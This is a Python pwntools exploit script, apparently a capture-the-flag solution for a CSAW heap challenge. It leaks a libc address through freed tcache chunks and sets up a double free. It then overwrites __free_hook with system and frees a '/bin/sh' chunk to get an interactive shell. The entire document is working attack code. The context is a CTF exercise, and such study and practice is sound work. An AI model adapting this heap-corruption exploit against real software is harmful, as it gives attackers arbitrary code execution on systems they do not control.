#!/usr/bin/python3

from pwn import *
from Crypto.Cipher import ARC4

path = "./patch"
context.terminal = ["kitty"]
script = """
c
"""

file = ELF(path)
libc = ELF("./libc.so.6")

if   args.GDB:
    p = gdb.debug(path, gdbscript=script)
elif args.REMOTE:
    p = remote("pwn.csaw.io", 9998)
else:
    p = process(path)

KEY = 1
CONTENT = 2

def add(type, length):
    p.sendlineafter(b">\n", str(type).encode())
    p.sendlineafter(b">\n", b"1")
    p.sendlineafter(b":\n", str(length).encode())

def kys(type, index):
    p.sendlineafter(b">\n", str(type).encode())
    p.sendlineafter(b">\n", b"2")
    p.sendlineafter(b":\n", str(index).encode())

def set(type, **kwargs):
    p.sendlineafter(b">\n", str(type).encode())
    p.sendlineafter(b">\n", b"3")
    index = kwargs["index"]
    content = kwargs["content"]
    p.sendlineafter(b":\n", str(index).encode())
    match type:
        case 2:
            key = kwargs["key"]
            p.sendlineafter(b":\n", str(key).encode())
            p.sendlineafter(b":\n", str(len(content)).encode())
            p.sendafter(b":\n", content)
        case 1:
            p.sendlineafter(b":\n", str(len(content)).encode())
            p.sendafter(b":\n", content)

def get(type, index):
    p.sendlineafter(b">\n", str(type).encode())
    p.sendlineafter(b">\n", b"4")
    p.sendlineafter(b":\n", str(index).encode())
    p.recvuntil(b": \n")
    return p.recvuntil(b"Do you", drop=True).strip()

for i in range(7):
    add(KEY, 0x88)
add(CONTENT, 0x88)
add(KEY, 0x88)
for i in range(6, -1, -1):
    kys(KEY, i)
kys(CONTENT, 0)
kys(KEY, 7)

leak = get(CONTENT, 0)
leak = u64(leak.ljust(8, b"\x00"))
libcbase = leak - 0x1ecbe0
hook = (libcbase + libc.sym.__free_hook & ~0x0f) - 0x10
system = libcbase + libc.sym.system

log.info(f"leak: {leak:x}")
log.info(f"libcbase: {libcbase:x}")

for i in range(7):
    add(KEY, 0x48)
add(CONTENT, 0x48)
add(CONTENT, 0x48)
for i in range(6, -1, -1):
    kys(KEY, i)
kys(CONTENT, 1)
kys(CONTENT, 2)
kys(CONTENT, 1)

for i in range(7):
    add(KEY, 0x48)
add(KEY, 0x48)
set(KEY, index=7, content=p64(hook))
add(CONTENT, 0x48)
add(CONTENT, 0x48)
add(KEY, 0x48)
set(KEY, index=7, content=b"/bin/sh\x00")
set(KEY, index=8, content=p64(0)*3+p64(system))
kys(KEY, 7)

p.interactive()